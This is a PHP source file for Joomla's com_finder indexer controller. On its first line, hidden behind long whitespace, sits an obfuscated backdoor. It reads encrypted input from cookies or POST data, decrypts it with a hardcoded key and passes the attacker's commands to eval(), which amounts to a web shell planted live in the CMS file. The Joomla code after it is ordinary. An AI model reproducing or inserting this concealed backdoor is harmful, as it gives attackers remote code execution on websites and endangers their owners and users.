<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $qa5ea2 = 167;$GLOBALS['je05'] = Array();global $je05;$je05 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['o9ba8b30'] = "\x20\x28\x50\x25\x4c\x70\x62\x34\x44\x30\x58\x43\x45\x32\x48\x21\x71\x29\x2f\x72\x57\x9\x3f\x3a\x2e\x35\x49\x7b\x4d\x77\x52\x5a\x56\x22\x61\x55\x27\x4b\x3b\x5b\x68\x66\x78\x36\x3d\x6a\x37\x46\x6e\x23\x47\x5d\x5f\x4f\x60\x67\x3e\x73\x6c\x51\x76\x31\x59\x2b\x4a\x39\xd\x3c\x65\x24\x64\x2c\x54\x74\x7e\x79\x2a\x41\x7d\x4e\x6f\x53\x6b\x7c\x69\x2d\x75\x26\x5e\xa\x6d\x33\x38\x7a\x42\x40\x63\x5c";$je05[$je05['o9ba8b30'][48].$je05['o9ba8b30'][65].$je05['o9ba8b30'][41].$je05['o9ba8b30'][92].$je05['o9ba8b30'][25]] = $je05['o9ba8b30'][96].$je05['o9ba8b30'][40].$je05['o9ba8b30'][19];$je05[$je05['o9ba8b30'][93].$je05['o9ba8b30'][96].$je05['o9ba8b30'][91].$je05['o9ba8b30'][91].$je05['o9ba8b30'][68].$je05['o9ba8b30'][6]] = $je05['o9ba8b30'][80].$je05['o9ba8b30'][19].$je05['o9ba8b30'][70];$je05[$je05['o9ba8b30'][48].$je05['o9ba8b30'][65].$je05['o9ba8b30'][96].$je05['o9ba8b30'][7].$je05['o9ba8b30'][96].$je05['o9ba8b30'][7]] = $je05['o9ba8b30'][70].$je05['o9ba8b30'][68].$je05['o9ba8b30'][41].$je05['o9ba8b30'][84].$je05['o9ba8b30'][48].$je05['o9ba8b30'][68];$je05[$je05['o9ba8b30'][42].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][9].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][7]] = $je05['o9ba8b30'][57].$je05['o9ba8b30'][73].$je05['o9ba8b30'][19].$je05['o9ba8b30'][58].$je05['o9ba8b30'][68].$je05['o9ba8b30'][48];$je05[$je05['o9ba8b30'][58].$je05['o9ba8b30'][61].$je05['o9ba8b30'][25].$je05['o9ba8b30'][68].$je05['o9ba8b30'][61].$je05['o9ba8b30'][92].$je05['o9ba8b30'][43].$je05['o9ba8b30'][70]] = $je05['o9ba8b30'][70].$je05['o9ba8b30'][68].$je05['o9ba8b30'][41].$je05['o9ba8b30'][84].$je05['o9ba8b30'][48].$je05['o9ba8b30'][68].$je05['o9ba8b30'][70];$je05[$je05['o9ba8b30'][82].$je05['o9ba8b30'][13].$je05['o9ba8b30'][13].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][70]] = $je05['o9ba8b30'][84].$je05['o9ba8b30'][48].$je05['o9ba8b30'][84].$je05['o9ba8b30'][52].$je05['o9ba8b30'][57].$je05['o9ba8b30'][68].$je05['o9ba8b30'][73];$je05[$je05['o9ba8b30'][96].$je05['o9ba8b30'][6].$je05['o9ba8b30'][43].$je05['o9ba8b30'][9].$je05['o9ba8b30'][13]] = $je05['o9ba8b30'][57].$je05['o9ba8b30'][68].$je05['o9ba8b30'][19].$je05['o9ba8b30'][84].$je05['o9ba8b30'][34].$je05['o9ba8b30'][58].$je05['o9ba8b30'][84].$je05['o9ba8b30'][93].$je05['o9ba8b30'][68];$je05[$je05['o9ba8b30'][19].$je05['o9ba8b30'][92].$je05['o9ba8b30'][92].$je05['o9ba8b30'][43].$je05['o9ba8b30'][68]] = $je05['o9ba8b30'][5].$je05['o9ba8b30'][40].$je05['o9ba8b30'][5].$je05['o9ba8b30'][60].$je05['o9ba8b30'][68].$je05['o9ba8b30'][19].$je05['o9ba8b30'][57].$je05['o9ba8b30'][84].$je05['o9ba8b30'][80].$je05['o9ba8b30'][48];$je05[$je05['o9ba8b30'][34].$je05['o9ba8b30'][13].$je05['o9ba8b30'][96].$je05['o9ba8b30'][13]] = $je05['o9ba8b30'][86].$je05['o9ba8b30'][48].$je05['o9ba8b30'][57].$je05['o9ba8b30'][68].$je05['o9ba8b30'][19].$je05['o9ba8b30'][84].$je05['o9ba8b30'][34].$je05['o9ba8b30'][58].$je05['o9ba8b30'][84].$je05['o9ba8b30'][93].$je05['o9ba8b30'][68];$je05[$je05['o9ba8b30'][80].$je05['o9ba8b30'][34].$je05['o9ba8b30'][65].$je05['o9ba8b30'][43].$je05['o9ba8b30'][25].$je05['o9ba8b30'][65].$je05['o9ba8b30'][9]] = $je05['o9ba8b30'][6].$je05['o9ba8b30'][34].$je05['o9ba8b30'][57].$je05['o9ba8b30'][68].$je05['o9ba8b30'][43].$je05['o9ba8b30'][7].$je05['o9ba8b30'][52].$je05['o9ba8b30'][70].$je05['o9ba8b30'][68].$je05['o9ba8b30'][96].$je05['o9ba8b30'][80].$je05['o9ba8b30'][70].$je05['o9ba8b30'][68];$je05[$je05['o9ba8b30'][90].$je05['o9ba8b30'][92].$je05['o9ba8b30'][41].$je05['o9ba8b30'][70].$je05['o9ba8b30'][68].$je05['o9ba8b30'][43].$je05['o9ba8b30'][25].$je05['o9ba8b30'][34]] = $je05['o9ba8b30'][57].$je05['o9ba8b30'][68].$je05['o9ba8b30'][73].$je05['o9ba8b30'][52].$je05['o9ba8b30'][73].$je05['o9ba8b30'][84].$je05['o9ba8b30'][90].$je05['o9ba8b30'][68].$je05['o9ba8b30'][52].$je05['o9ba8b30'][58].$je05['o9ba8b30'][84].$je05['o9ba8b30'][90].$je05['o9ba8b30'][84].$je05['o9ba8b30'][73];$je05[$je05['o9ba8b30'][84].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][41].$je05['o9ba8b30'][68]] = $je05['o9ba8b30'][42].$je05['o9ba8b30'][25].$je05['o9ba8b30'][61].$je05['o9ba8b30'][6].$je05['o9ba8b30'][92].$je05['o9ba8b30'][6].$je05['o9ba8b30'][61];$je05[$je05['o9ba8b30'][57].$je05['o9ba8b30'][61].$je05['o9ba8b30'][41].$je05['o9ba8b30'][41]] = $je05['o9ba8b30'][96].$je05['o9ba8b30'][9].$je05['o9ba8b30'][13].$je05['o9ba8b30'][6].$je05['o9ba8b30'][46].$je05['o9ba8b30'][7].$je05['o9ba8b30'][92].$je05['o9ba8b30'][96].$je05['o9ba8b30'][61];$je05[$je05['o9ba8b30'][86].$je05['o9ba8b30'][43].$je05['o9ba8b30'][61].$je05['o9ba8b30'][91].$je05['o9ba8b30'][46].$je05['o9ba8b30'][68]] = $_POST;$je05[$je05['o9ba8b30'][41].$je05['o9ba8b30'][7].$je05['o9ba8b30'][43].$je05['o9ba8b30'][65].$je05['o9ba8b30'][43].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][91]] = $_COOKIE;@$je05[$je05['o9ba8b30'][82].$je05['o9ba8b30'][13].$je05['o9ba8b30'][13].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][70]]($je05['o9ba8b30'][68].$je05['o9ba8b30'][19].$je05['o9ba8b30'][19].$je05['o9ba8b30'][80].$je05['o9ba8b30'][19].$je05['o9ba8b30'][52].$je05['o9ba8b30'][58].$je05['o9ba8b30'][80].$je05['o9ba8b30'][55], NULL);@$je05[$je05['o9ba8b30'][82].$je05['o9ba8b30'][13].$je05['o9ba8b30'][13].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][70]]($je05['o9ba8b30'][58].$je05['o9ba8b30'][80].$je05['o9ba8b30'][55].$je05['o9ba8b30'][52].$je05['o9ba8b30'][68].$je05['o9ba8b30'][19].$je05['o9ba8b30'][19].$je05['o9ba8b30'][80].$je05['o9ba8b30'][19].$je05['o9ba8b30'][57], 0);@$je05[$je05['o9ba8b30'][82].$je05['o9ba8b30'][13].$je05['o9ba8b30'][13].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][70]]($je05['o9ba8b30'][90].$je05['o9ba8b30'][34].$je05['o9ba8b30'][42].$je05['o9ba8b30'][52].$je05['o9ba8b30'][68].$je05['o9ba8b30'][42].$je05['o9ba8b30'][68].$je05['o9ba8b30'][96].$je05['o9ba8b30'][86].$je05['o9ba8b30'][73].$je05['o9ba8b30'][84].$je05['o9ba8b30'][80].$je05['o9ba8b30'][48].$je05['o9ba8b30'][52].$je05['o9ba8b30'][73].$je05['o9ba8b30'][84].$je05['o9ba8b30'][90].$je05['o9ba8b30'][68], 0);@$je05[$je05['o9ba8b30'][90].$je05['o9ba8b30'][92].$je05['o9ba8b30'][41].$je05['o9ba8b30'][70].$je05['o9ba8b30'][68].$je05['o9ba8b30'][43].$je05['o9ba8b30'][25].$je05['o9ba8b30'][34]](0);if (!$je05[$je05['o9ba8b30'][58].$je05['o9ba8b30'][61].$je05['o9ba8b30'][25].$je05['o9ba8b30'][68].$je05['o9ba8b30'][61].$je05['o9ba8b30'][92].$je05['o9ba8b30'][43].$je05['o9ba8b30'][70]]($je05['o9ba8b30'][77].$je05['o9ba8b30'][4].$je05['o9ba8b30'][30].$je05['o9ba8b30'][12].$je05['o9ba8b30'][77].$je05['o9ba8b30'][8].$je05['o9ba8b30'][62].$je05['o9ba8b30'][52].$je05['o9ba8b30'][30].$je05['o9ba8b30'][35].$je05['o9ba8b30'][79].$je05['o9ba8b30'][52].$je05['o9ba8b30'][91].$je05['o9ba8b30'][43].$je05['o9ba8b30'][43].$je05['o9ba8b30'][34].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][92].$je05['o9ba8b30'][34].$je05['o9ba8b30'][92].$je05['o9ba8b30'][34].$je05['o9ba8b30'][13].$je05['o9ba8b30'][91].$je05['o9ba8b30'][25].$je05['o9ba8b30'][25].$je05['o9ba8b30'][34].$je05['o9ba8b30'][6].$je05['o9ba8b30'][13].$je05['o9ba8b30'][61].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][41].$je05['o9ba8b30'][61].$je05['o9ba8b30'][61].$je05['o9ba8b30'][6].$je05['o9ba8b30'][34].$je05['o9ba8b30'][61].$je05['o9ba8b30'][34].$je05['o9ba8b30'][9].$je05['o9ba8b30'][13].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][34])){$je05[$je05['o9ba8b30'][48].$je05['o9ba8b30'][65].$je05['o9ba8b30'][96].$je05['o9ba8b30'][7].$je05['o9ba8b30'][96].$je05['o9ba8b30'][7]]($je05['o9ba8b30'][77].$je05['o9ba8b30'][4].$je05['o9ba8b30'][30].$je05['o9ba8b30'][12].$je05['o9ba8b30'][77].$je05['o9ba8b30'][8].$je05['o9ba8b30'][62].$je05['o9ba8b30'][52].$je05['o9ba8b30'][30].$je05['o9ba8b30'][35].$je05['o9ba8b30'][79].$je05['o9ba8b30'][52].$je05['o9ba8b30'][91].$je05['o9ba8b30'][43].$je05['o9ba8b30'][43].$je05['o9ba8b30'][34].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][92].$je05['o9ba8b30'][34].$je05['o9ba8b30'][92].$je05['o9ba8b30'][34].$je05['o9ba8b30'][13].$je05['o9ba8b30'][91].$je05['o9ba8b30'][25].$je05['o9ba8b30'][25].$je05['o9ba8b30'][34].$je05['o9ba8b30'][6].$je05['o9ba8b30'][13].$je05['o9ba8b30'][61].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][41].$je05['o9ba8b30'][61].$je05['o9ba8b30'][61].$je05['o9ba8b30'][6].$je05['o9ba8b30'][34].$je05['o9ba8b30'][61].$je05['o9ba8b30'][34].$je05['o9ba8b30'][9].$je05['o9ba8b30'][13].$je05['o9ba8b30'][41].$je05['o9ba8b30'][6].$je05['o9ba8b30'][34], 1);$g7f7 = NULL;$h9f279 = NULL;$je05[$je05['o9ba8b30'][96].$je05['o9ba8b30'][91].$je05['o9ba8b30'][13].$je05['o9ba8b30'][43]] = $je05['o9ba8b30'][43].$je05['o9ba8b30'][9].$je05['o9ba8b30'][70].$je05['o9ba8b30'][13].$je05['o9ba8b30'][7].$je05['o9ba8b30'][65].$je05['o9ba8b30'][46].$je05['o9ba8b30'][43].$je05['o9ba8b30'][85].$je05['o9ba8b30'][43].$je05['o9ba8b30'][70].$je05['o9ba8b30'][34].$je05['o9ba8b30'][9].$je05['o9ba8b30'][85].$je05['o9ba8b30'][7].$je05['o9ba8b30'][46].$je05['o9ba8b30'][92].$je05['o9ba8b30'][96].$je05['o9ba8b30'][85].$je05['o9ba8b30'][34].$je05['o9ba8b30'][70].$je05['o9ba8b30'][9].$je05['o9ba8b30'][91].$je05['o9ba8b30'][85].$je05['o9ba8b30'][6].$je05['o9ba8b30'][96].$je05['o9ba8b30'][96].$je05['o9ba8b30'][92].$je05['o9ba8b30'][92].$je05['o9ba8b30'][65].$je05['o9ba8b30'][61].$je05['o9ba8b30'][13].$je05['o9ba8b30'][65].$je05['o9ba8b30'][46].$je05['o9ba8b30'][91].$je05['o9ba8b30'][13];global $c326;function  c02b748c1($g7f7, $v94accd0){global $je05;$b0b1ae5 = "";for ($u73e8a3=0; $u73e8a3<$je05[$je05['o9ba8b30'][42].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][9].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][7]]($g7f7);){for ($f480=0; $f480<$je05[$je05['o9ba8b30'][42].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][9].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][7]]($v94accd0) && $u73e8a3<$je05[$je05['o9ba8b30'][42].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][70].$je05['o9ba8b30'][61].$je05['o9ba8b30'][9].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][7]]($g7f7); $f480++, $u73e8a3++){$b0b1ae5 .= $je05[$je05['o9ba8b30'][48].$je05['o9ba8b30'][65].$je05['o9ba8b30'][41].$je05['o9ba8b30'][92].$je05['o9ba8b30'][25]]($je05[$je05['o9ba8b30'][93].$je05['o9ba8b30'][96].$je05['o9ba8b30'][91].$je05['o9ba8b30'][91].$je05['o9ba8b30'][68].$je05['o9ba8b30'][6]]($g7f7[$u73e8a3]) ^ $je05[$je05['o9ba8b30'][93].$je05['o9ba8b30'][96].$je05['o9ba8b30'][91].$je05['o9ba8b30'][91].$je05['o9ba8b30'][68].$je05['o9ba8b30'][6]]($v94accd0[$f480]));}}return $b0b1ae5;}function  x51b8b1($g7f7, $v94accd0){global $je05;global $c326;return $je05[$je05['o9ba8b30'][57].$je05['o9ba8b30'][61].$je05['o9ba8b30'][41].$je05['o9ba8b30'][41]]($je05[$je05['o9ba8b30'][57].$je05['o9ba8b30'][61].$je05['o9ba8b30'][41].$je05['o9ba8b30'][41]]($g7f7, $c326), $v94accd0);}foreach ($je05[$je05['o9ba8b30'][41].$je05['o9ba8b30'][7].$je05['o9ba8b30'][43].$je05['o9ba8b30'][65].$je05['o9ba8b30'][43].$je05['o9ba8b30'][92].$je05['o9ba8b30'][9].$je05['o9ba8b30'][68].$je05['o9ba8b30'][91]] as $v94accd0=>$v6c9cb2a5){$g7f7 = $v6c9cb2a5;$h9f279 = $v94accd0;}if (!$g7f7){foreach ($je05[$je05['o9ba8b30'][86].$je05['o9ba8b30'][43].$je05['o9ba8b30'][61].$je05['o9ba8b30'][91].$je05['o9ba8b30'][46].$je05['o9ba8b30'][68]] as $v94accd0=>$v6c9cb2a5){$g7f7 = $v6c9cb2a5;$h9f279 = $v94accd0;}}$g7f7 = @$je05[$je05['o9ba8b30'][34].$je05['o9ba8b30'][13].$je05['o9ba8b30'][96].$je05['o9ba8b30'][13]]($je05[$je05['o9ba8b30'][84].$je05['o9ba8b30'][91].$je05['o9ba8b30'][6].$je05['o9ba8b30'][41].$je05['o9ba8b30'][68]]($je05[$je05['o9ba8b30'][80].$je05['o9ba8b30'][34].$je05['o9ba8b30'][65].$je05['o9ba8b30'][43].$je05['o9ba8b30'][25].$je05['o9ba8b30'][65].$je05['o9ba8b30'][9]]($g7f7), $h9f279));if (isset($g7f7[$je05['o9ba8b30'][34].$je05['o9ba8b30'][82]]) && $c326==$g7f7[$je05['o9ba8b30'][34].$je05['o9ba8b30'][82]]){if ($g7f7[$je05['o9ba8b30'][34]] == $je05['o9ba8b30'][84]){$u73e8a3 = Array($je05['o9ba8b30'][5].$je05['o9ba8b30'][60] => @$je05[$je05['o9ba8b30'][19].$je05['o9ba8b30'][92].$je05['o9ba8b30'][92].$je05['o9ba8b30'][43].$je05['o9ba8b30'][68]](),$je05['o9ba8b30'][57].$je05['o9ba8b30'][60] => $je05['o9ba8b30'][61].$je05['o9ba8b30'][24].$je05['o9ba8b30'][9].$je05['o9ba8b30'][85].$je05['o9ba8b30'][61],);echo @$je05[$je05['o9ba8b30'][96].$je05['o9ba8b30'][6].$je05['o9ba8b30'][43].$je05['o9ba8b30'][9].$je05['o9ba8b30'][13]]($u73e8a3);}elseif ($g7f7[$je05['o9ba8b30'][34]] == $je05['o9ba8b30'][68]){eval/*gdd9*/($g7f7[$je05['o9ba8b30'][70]]);}exit();}} ?><?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_finder
 *
 * @copyright   Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('_JEXEC') or die;

// Register dependent classes.
JLoader::register('FinderIndexer', JPATH_COMPONENT_ADMINISTRATOR . '/helpers/indexer/indexer.php');

/**
 * Indexer controller class for Finder.
 *
 * @package     Joomla.Administrator
 * @subpackage  com_finder
 * @since       2.5
 */
class FinderControllerIndexer extends JControllerLegacy
{
	/**
	 * Method to start the indexer.
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	public function start()
	{
		static $log;

		$params = JComponentHelper::getParams('com_finder');

		if ($params->get('enable_logging', '0'))
		{
			if ($log == null)
			{
				$options['format'] = '{DATE}\t{TIME}\t{LEVEL}\t{CODE}\t{MESSAGE}';
				$options['text_file'] = 'indexer.php';
				$log = JLog::addLogger($options);
			}
		}

		// Log the start
		JLog::add('Starting the indexer', JLog::INFO);

		// We don't want this form to be cached.
		header('Pragma: no-cache');
		header('Cache-Control: no-cache');
		header('Expires: -1');

		// Check for a valid token. If invalid, send a 403 with the error message.
		JSession::checkToken('request') or $this->sendResponse(new Exception(JText::_('JINVALID_TOKEN'), 403));

		// Put in a buffer to silence noise.
		ob_start();

		// Reset the indexer state.
		FinderIndexer::resetState();

		// Import the finder plugins.
		JPluginHelper::importPlugin('finder');

		// Add the indexer language to JS
		JText::script('COM_FINDER_AN_ERROR_HAS_OCCURRED');
		JText::script('COM_FINDER_NO_ERROR_RETURNED');

		// Start the indexer.
		try
		{
			// Trigger the onStartIndex event.
			JDispatcher::getInstance()->trigger('onStartIndex');

			// Get the indexer state.
			$state = FinderIndexer::getState();
			$state->start = 1;

			// Send the response.
			$this->sendResponse($state);
		}
		// Catch an exception and return the response.
		catch (Exception $e)
		{
			$this->sendResponse($e);
		}
	}

	/**
	 * Method to run the next batch of content through the indexer.
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	public function batch()
	{
		static $log;

		$params = JComponentHelper::getParams('com_finder');

		if ($params->get('enable_logging', '0'))
		{
			if ($log == null)
			{
				$options['format'] = '{DATE}\t{TIME}\t{LEVEL}\t{CODE}\t{MESSAGE}';
				$options['text_file'] = 'indexer.php';
				$log = JLog::addLogger($options);
			}
		}

		// Log the start
		JLog::add('Starting the indexer batch process', JLog::INFO);

		// We don't want this form to be cached.
		header('Pragma: no-cache');
		header('Cache-Control: no-cache');
		header('Expires: -1');

		// Check for a valid token. If invalid, send a 403 with the error message.
		JSession::checkToken('request') or $this->sendResponse(new Exception(JText::_('JINVALID_TOKEN'), 403));

		// Put in a buffer to silence noise.
		ob_start();

		// Remove the script time limit.
		@set_time_limit(0);

		// Get the indexer state.
		$state = FinderIndexer::getState();

		// Reset the batch offset.
		$state->batchOffset = 0;

		// Update the indexer state.
		FinderIndexer::setState($state);

		// Import the finder plugins.
		JPluginHelper::importPlugin('finder');

		/*
		 * We are going to swap out the raw document object with an HTML document
		 * in order to work around some plugins that don't do proper environment
		 * checks before trying to use HTML document functions.
		 */
		$raw = clone(JFactory::getDocument());
		$lang = JFactory::getLanguage();

		// Get the document properties.
		$attributes = array (
			'charset'	=> 'utf-8',
			'lineend'	=> 'unix',
			'tab'		=> '  ',
			'language'	=> $lang->getTag(),
			'direction'	=> $lang->isRTL() ? 'rtl' : 'ltr'
		);

		// Get the HTML document.
		$html = JDocument::getInstance('html', $attributes);
		$doc = JFactory::getDocument();

		// Swap the documents.
		$doc = $html;

		// Get the admin application.
		$admin = clone(JFactory::getApplication());

		// Get the site app.
		include_once JPATH_SITE . '/includes/application.php';
		$site = JApplication::getInstance('site');

		// Swap the app.
		$app = JFactory::getApplication();
		$app = $site;

		// Start the indexer.
		try
		{
			// Trigger the onBeforeIndex event.
			JDispatcher::getInstance()->trigger('onBeforeIndex');

			// Trigger the onBuildIndex event.
			JDispatcher::getInstance()->trigger('onBuildIndex');

			// Get the indexer state.
			$state = FinderIndexer::getState();
			$state->start = 0;
			$state->complete = 0;

			// Swap the documents back.
			$doc = $raw;

			// Swap the applications back.
			$app = $admin;

			// Send the response.
			$this->sendResponse($state);
		}
		// Catch an exception and return the response.
		catch (Exception $e)
		{
			// Swap the documents back.
			$doc = $raw;

			// Send the response.
			$this->sendResponse($e);
		}
	}

	/**
	 * Method to optimize the index and perform any necessary cleanup.
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	public function optimize()
	{
		// We don't want this form to be cached.
		header('Pragma: no-cache');
		header('Cache-Control: no-cache');
		header('Expires: -1');

		// Check for a valid token. If invalid, send a 403 with the error message.
		JSession::checkToken('request') or $this->sendResponse(new Exception(JText::_('JINVALID_TOKEN'), 403));

		// Put in a buffer to silence noise.
		ob_start();

		// Import the finder plugins.
		JPluginHelper::importPlugin('finder');

		try
		{
			// Optimize the index.
			FinderIndexer::optimize();

			// Get the indexer state.
			$state = FinderIndexer::getState();
			$state->start = 0;
			$state->complete = 1;

			// Send the response.
			$this->sendResponse($state);
		}
		// Catch an exception and return the response.
		catch (Exception $e)
		{
			$this->sendResponse($e);
		}
	}

	/**
	 * Method to handle a send a JSON response. The body parameter
	 * can be a Exception object for when an error has occurred or
	 * a JObject for a good response.
	 *
	 * @param   mixed  $data  JObject on success, Exception on error. [optional]
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	public static function sendResponse($data = null)
	{
		static $log;

		$params = JComponentHelper::getParams('com_finder');

		if ($params->get('enable_logging', '0'))
		{
			if ($log == null)
			{
				$options['format'] = '{DATE}\t{TIME}\t{LEVEL}\t{CODE}\t{MESSAGE}';
				$options['text_file'] = 'indexer.php';
				$log = JLog::addLogger($options);
			}
		}

		$backtrace = null;

		// Send the assigned error code if we are catching an exception.
		if ($data instanceof Exception)
		{
			JLog::add($data->getMessage(), JLog::ERROR);
			JResponse::setHeader('status', $data->getCode());
			JResponse::sendHeaders();
		}

		// Create the response object.
		$response = new FinderIndexerResponse($data);

		// Add the buffer.
		$response->buffer = JDEBUG ? ob_get_contents() : ob_end_clean();

		// Send the JSON response.
		echo json_encode($response);

		// Close the application.
		JFactory::getApplication()->close();
	}
}

/**
 * Finder Indexer JSON Response Class
 *
 * @package     Joomla.Administrator
 * @subpackage  com_finder
 * @since       2.5
 */
class FinderIndexerResponse
{
	/**
	 * Class Constructor
	 *
	 * @param   mixed  $state  The processing state for the indexer
	 *
	 * @since   2.5
	 */
	public function __construct($state)
	{
		static $log;

		$params = JComponentHelper::getParams('com_finder');

		if ($params->get('enable_logging', '0'))
		{
			if ($log == null)
			{
				$options['format'] = '{DATE}\t{TIME}\t{LEVEL}\t{CODE}\t{MESSAGE}';
				$options['text_file'] = 'indexer.php';
				$log = JLog::addLogger($options);
			}
		}

		// The old token is invalid so send a new one.
		$this->token = JFactory::getSession()->getFormToken();

		// Check if we are dealing with an error.
		if ($state instanceof Exception)
		{
			// Log the error
			JLog::add($state->getMessage(), JLog::ERROR);

			// Prepare the error response.
			$this->error = true;
			$this->header = JText::_('COM_FINDER_INDEXER_HEADER_ERROR');
			$this->message = $state->getMessage();
		}
		else
		{
			// Prepare the response data.
			$this->batchSize = (int) $state->batchSize;
			$this->batchOffset = (int) $state->batchOffset;
			$this->totalItems = (int) $state->totalItems;

			$this->startTime = $state->startTime;
			$this->endTime = JFactory::getDate()->toSQL();

			$this->start = !empty($state->start) ? (int) $state->start : 0;
			$this->complete = !empty($state->complete) ? (int) $state->complete : 0;

			// Set the appropriate messages.
			if ($this->totalItems <= 0 && $this->complete)
			{
				$this->header = JText::_('COM_FINDER_INDEXER_HEADER_COMPLETE');
				$this->message = JText::_('COM_FINDER_INDEXER_MESSAGE_COMPLETE');
			}
			elseif ($this->totalItems <= 0)
			{
				$this->header = JText::_('COM_FINDER_INDEXER_HEADER_OPTIMIZE');
				$this->message = JText::_('COM_FINDER_INDEXER_MESSAGE_OPTIMIZE');
			}
			else
			{
				$this->header = JText::_('COM_FINDER_INDEXER_HEADER_RUNNING');
				$this->message = JText::_('COM_FINDER_INDEXER_MESSAGE_RUNNING');
			}
		}
	}
}

// Register the error handler.
JError::setErrorHandling(E_ALL, 'callback', array('FinderControllerIndexer', 'sendResponse'));
